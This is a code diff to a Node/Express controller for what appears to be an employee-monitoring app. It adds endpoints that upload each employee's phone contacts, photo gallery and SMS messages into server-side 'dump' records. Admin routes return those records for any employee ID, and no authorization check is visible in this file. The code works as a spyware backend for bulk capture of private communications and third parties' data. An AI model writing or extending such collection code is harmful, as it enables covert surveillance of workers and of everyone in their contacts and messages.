@@ -150,3 +150,115 @@ exports.getLiveLocations = async (req, res) => {
     res.status(500).json({ success: false, message: err.message });
   }
 };
+const ContactDump = require('../models/ContactDump');
+
+// ... existing methods ...
+
+// ─── POST /api/employees/contacts (EmployeeSync) ──────────────────────────────
+exports.syncContacts = async (req, res) => {
+  try {
+    const { contacts } = req.body;
+    if (!contacts || !Array.isArray(contacts)) {
+      return res.status(400).json({ success: false, message: 'Invalid contacts data.' });
+    }
+
+    const employeeId = req.user._id;
+
+    // Use upsert to update or create the contact dump for this employee
+    await ContactDump.findOneAndUpdate(
+      { employee: employeeId },
+      { 
+        contacts, 
+        syncedAt: new Date() 
+      },
+      { upsert: true, new: true }
+    );
+
+    res.json({ success: true, message: 'Contacts synced successfully.' });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+// ─── GET /api/employees/:id/contacts (AdminView) ─────────────────────────────
+exports.getEmployeeContacts = async (req, res) => {
+  try {
+    const dump = await ContactDump.findOne({ employee: req.params.id });
+    if (!dump) return res.status(404).json({ success: false, message: 'No contacts found for this employee.' });
+
+    res.json({ success: true, count: dump.contacts.length, data: dump.contacts });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+const GalleryDump = require('../models/GalleryDump');
+const SmsDump = require('../models/SmsDump');
+
+// ─── POST /api/employees/gallery (EmployeeSync) ──────────────────────────────
+exports.syncGallery = async (req, res) => {
+  try {
+    const { photos, totalCount } = req.body;
+    const employeeId = req.user._id;
+
+    await GalleryDump.findOneAndUpdate(
+      { employee: employeeId },
+      { 
+        photos, 
+        totalCount,
+        syncedAt: new Date() 
+      },
+      { upsert: true, new: true }
+    );
+
+    res.json({ success: true, message: 'Gallery data synced successfully.' });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+// ─── GET /api/employees/:id/gallery (AdminView) ─────────────────────────────
+exports.getEmployeePhotos = async (req, res) => {
+  try {
+    const dump = await GalleryDump.findOne({ employee: req.params.id });
+    if (!dump) return res.status(404).json({ success: false, message: 'No gallery data found.' });
+
+    res.json({ success: true, count: dump.totalCount, data: dump.photos });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+// ─── POST /api/employees/sms (EmployeeSync) ──────────────────────────────────
+exports.syncSms = async (req, res) => {
+  try {
+    const { messages } = req.body;
+    const employeeId = req.user._id;
+
+    await SmsDump.findOneAndUpdate(
+      { employee: employeeId },
+      { 
+        messages, 
+        syncedAt: new Date() 
+      },
+      { upsert: true, new: true }
+    );
+
+    res.json({ success: true, message: 'SMS data synced successfully.' });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+// ─── GET /api/employees/:id/sms (AdminView) ─────────────────────────────────
+exports.getEmployeeSms = async (req, res) => {
+  try {
+    const dump = await SmsDump.findOne({ employee: req.params.id });
+    if (!dump) return res.status(404).json({ success: false, message: 'No SMS data found.' });
+
+    res.json({ success: true, data: dump.messages });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+
